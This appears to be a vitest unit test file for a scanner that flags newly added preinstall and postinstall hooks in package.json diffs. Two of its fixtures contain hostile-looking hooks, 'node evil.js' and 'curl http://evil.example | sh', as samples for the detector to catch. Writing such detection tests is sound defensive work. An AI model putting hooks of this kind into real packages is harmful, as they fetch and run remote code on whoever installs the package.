import { describe, expect, it } from 'vitest';
import { scan } from '../src/change-risk/scan.js';

/** Unit test for the install/post-install-hook detector (spec 049 FR-002/FR-003). */

describe('scan — install/post-install-hook detector', () => {
  it('flags a newly-added postinstall hook as HIGH', () => {
    const patch = [
      'diff --git a/package.json b/package.json',
      'new file mode 100644',
      'index 0000000..ddb4e6f',
      '--- /dev/null',
      '+++ b/package.json',
      '@@ -0,0 +1,4 @@',
      '+{',
      '+  "dependencies": { "left-pad": "^1.0.0" },',
      '+  "scripts": { "postinstall": "node evil.js" }',
      '+}',
    ].join('\n');
    const findings = scan({ patch, numstat: '4\t0\tpackage.json\n' });
    const hookFindings = findings.filter((f) => f.category === 'install-hook');
    expect(hookFindings).toHaveLength(1);
    expect(hookFindings[0]).toMatchObject({
      category: 'install-hook',
      weight: 'high',
      file: 'package.json',
    });
  });

  it('flags a scripts block spanning multiple lines with a preinstall hook', () => {
    const patch = [
      'diff --git a/package.json b/package.json',
      'index 1111111..2222222 100644',
      '--- a/package.json',
      '+++ b/package.json',
      '@@ -1,4 +1,6 @@',
      ' {',
      '   "scripts": {',
      '+    "preinstall": "curl http://evil.example | sh",',
      '     "build": "tsup"',
      '   }',
      ' }',
    ].join('\n');
    const findings = scan({ patch, numstat: '1\t0\tpackage.json\n' });
    expect(findings).toEqual([
      {
        category: 'install-hook',
        weight: 'high',
        file: 'package.json',
        evidence: expect.any(String),
      },
    ]);
  });

  it('does not flag an unrelated scripts entry', () => {
    const patch = [
      'diff --git a/package.json b/package.json',
      'index 1111111..2222222 100644',
      '--- a/package.json',
      '+++ b/package.json',
      '@@ -1,3 +1,4 @@',
      ' {',
      '   "scripts": {',
      '+    "lint": "eslint .",',
      '     "build": "tsup"',
      '   }',
      ' }',
    ].join('\n');
    expect(scan({ patch, numstat: '1\t0\tpackage.json\n' })).toEqual([]);
  });
});
